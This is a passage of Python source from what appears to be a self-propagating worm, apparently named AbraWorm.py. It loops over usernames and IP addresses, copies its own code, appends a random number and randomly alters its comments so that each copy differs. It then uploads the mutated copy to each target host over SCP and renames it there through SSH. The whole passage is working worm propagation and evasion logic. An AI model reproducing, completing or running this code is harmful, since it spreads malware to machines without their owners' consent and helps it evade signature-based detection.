        ...
        for user in usernames:
            ...
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                ...
                try:
                    ...
                    ## Copy all the lines of this file in a variable
                    content = []
                    with open(sys.argv[0],'r') as f:
                        content = f.readlines()
                    ## Add a random number to the end of the file
                    content.append("\n## This is a random number added to the end of the worm file:\n")
                    content.append("##Random number: ")
                    content.append(str(random.randint(0, 1000000)))
                    content.append(" End!\n")
                    
                    # Find commented lines in content and alter the comments randomly
                    for i in range(len(content)):
                        if content[i].find('#') >= 0:
                            if random.random() > 0.5:
                                content[i] = content[i].replace('##','####')
                                
                    ## Open a temp file and copy the contents of this file on to it
                    ## and then copy the temp file back to the target host
                    with open('new_worm.py','w') as f:
                        f.writelines(content)
                        
                    print("new worm created")
                    ## Now deposit a copy of AbraWorm.py at the target host:
                    scpcon.put('new_worm.py')              
                    
                    # Rename the worm file to original filename
                    cmd = 'mv new_worm.py ' + sys.argv[0]
                    stdin, stdout, stderr = ssh.exec_command(cmd)
